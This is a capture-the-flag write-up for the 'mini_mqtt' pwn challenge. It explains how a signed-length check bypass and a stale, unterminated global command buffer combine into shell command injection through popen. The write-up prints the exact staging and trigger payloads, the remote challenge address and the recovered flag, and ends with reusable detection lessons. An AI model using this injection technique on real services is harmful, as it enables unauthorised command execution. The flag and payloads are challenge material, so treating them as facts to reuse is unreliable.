# CTF Pwn Methodology: mini_mqtt

**Date**: 2026-03-28
**Binary**: `pwn`
**Architecture**: `x86_64`
**Mitigations**: `NX`, `Full RELRO`, `PIE`, `Canary`, `SHSTK`, `IBT`
**Vulnerability Class**: `signed-length bypass plus stale global command-tail reuse`
**Primitives**: `negative-length check bypass`, `staged global command injection`, `remote shell-command execution via popen`
**Reuse Tags**: `cmd-injection`
**User-Provided ida-no-mcp Pseudocode**: no

## 1. Snapshot

- Goal: recover the flag from the MQTT-backed remote service at `nc1.ctfplus.cn:29959`.
- Local artifacts used: the provided PIE client binary `pwn`, bundled `libc.so.6`, `ld-linux-x86-64.so.2`, `libpaho-mqtt3c.so.1`, plus `objdump`, `readelf`, `strings`, and live MQTT interaction.
- The bundled binary crashed immediately under the host environment with `*** stack smashing detected ***` before it reached useful local traffic, so the solve relied on disassembly plus remote protocol validation instead of a full local replay.
- The headless IDA export wrapper was attempted, but it failed with `Cannot continue without a valid license -> OK`; the exploit was completed from disassembly.

## 2. Ground Truth

- `checksec` showed Full RELRO, PIE, Canary, NX, and CET notes (`SHSTK`, `IBT`).
- `main` connects to the MQTT broker, subscribes to topic `HTTP`, and publishes a heartbeat JSON message `{"clientid":"httpclient", "message":"200"}` once per second.
- `msgarrvd` treats any non-`httpclient` payload as an HTTP request and passes it to `http()`.
- `http()` parses a filename and `ContentLength` from the request, then:
  - sanitizes `/` and `.` into `_`
  - builds a local shell command with `snprintf(local, 0x80, "cat /home/ctf/%s", filename)`
  - copies it into the global `cmd` buffer with `memcpy(cmd, local, strlen(local))`
  - only afterwards checks whether the filename equals `index_html`
  - calls `popen(cmd, "r")` only on the allowlisted `index_html` path
- The decisive bug pair came from disassembly:
  - the length check sign-extends the attacker-controlled `int` and then uses `cmp rax, rdx; jbe`, so negative `ContentLength` values behave like huge unsigned integers and bypass the intended `strlen(filename) <= ContentLength` clamp
  - the global `cmd` copy omits the NUL terminator, so a later shorter command leaves the older tail intact
- Remote runtime proved the service is a standard MQTT 3.1.1 broker and that the hidden challenge process really publishes the `200` heartbeat on topic `HTTP`.

## 3. Exploit Chain

- Stage 1: connect as a normal MQTT client, subscribe to `HTTP`, and confirm the remote `httpclient` heartbeat.
- Stage 2: stage a long shell tail with a negative content length:
  - publish `GET /home/ctf/index_html;pwd HTTP/1.1\r\nHost: x\r\nContentLength: -1\r\n\r\n`
  - the signed/unsigned bug accepts the overlong filename
  - `http()` copies `cat /home/ctf/index_html;pwd` into the global `cmd`
  - the later `strcmp(filename, "index_html")` fails, so nothing executes yet
- Stage 3: trigger execution with a valid short request:
  - publish `GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n\r\n`
  - `http()` rewrites only the first 24 bytes of `cmd` with `cat /home/ctf/index_html`
  - the stale tail `;pwd` survives because no NUL is written
  - `popen(cmd, "r")` runs `cat /home/ctf/index_html;pwd`
- Stage 4: remote enumeration showed:
  - `pwd` returned `/home/ctf`
  - `echo\t*` returned `bin dev flag ld-linux-x86-64.so.2 lib lib32 lib64 libc.so.6 libexec libpaho-mqtt3c.so.1 libx32 pwn`
  - the `flag` file lives directly in the working directory
- Stage 5: final payload:
  - stage `index_html;cat\tflag` with `ContentLength: -1`
  - trigger with the short valid `index_html` request
  - the MQTT response leaked `polarisctf{21410fb0-b632-4314-b341-9a84cfc28732}`
- Decisive insight: the allowlist check happens after the long command is already copied into the global buffer, and the follow-up valid request rewrites only the prefix; once the signed check accepts a negative `ContentLength`, the stale tail turns the next `popen()` into shell command injection.

## 4. Dead Ends Worth Remembering

- Route attempted: treat the challenge as a memory-corruption problem because the local sample crashed with `stack smashing detected`.
- Why it failed: the live remote service kept sending stable MQTT heartbeats, and the shortest path never needed to reproduce the local abort or touch the stack canary.
- Earlier signal that should have warned about the failure: the main binary is tiny and most logic lives in its own request parser, not in deep heap machinery; once `strings` showed `cat /home/ctf/%s`, `index_html`, and `ContentLength`, the better starting point was parser order and shell-string handling.
- Route attempted: direct one-shot command injection in a single request.
- Why it failed: the exact `strcmp(filename, "index_html")` gate blocks execution of the staged long filename on the first request.
- Earlier signal that should have warned about the failure: the missing NUL on the global `cmd` copy strongly suggests a two-request stale-tail pattern rather than a single-request bypass.

## 5. Lessons to Reuse

- Signals to watch for:
  - signed `%d` or `sscanf` results that are later sign-extended and compared with unsigned jumps such as `jbe` or `ja`
  - command strings copied into globals or shared buffers with `memcpy(..., strlen(src))` instead of a bounded `snprintf` or an explicit terminator write
  - allowlist checks that happen after the command buffer is already populated
- Mitigation mix:
  - Full RELRO, PIE, Canary, and CET were irrelevant because the shortest route stayed in logic-land and reused the program's own `popen()` helper.
- Reusable trick:
  - if a negative or otherwise underflowed length bypass lets you stage a longer shell string into a global buffer, a second allowlisted request can often re-arm the safe prefix while preserving the malicious suffix
  - shell metacharacters can still be practical under tight parser filters: here `;` plus tab-as-whitespace was enough, and `/` was unnecessary because the target `flag` file lived in the current directory
- Should `patterns.md` be updated: yes. Add a reusable `cmd-injection` pattern for signed-length bypasses paired with stale command-buffer tails.
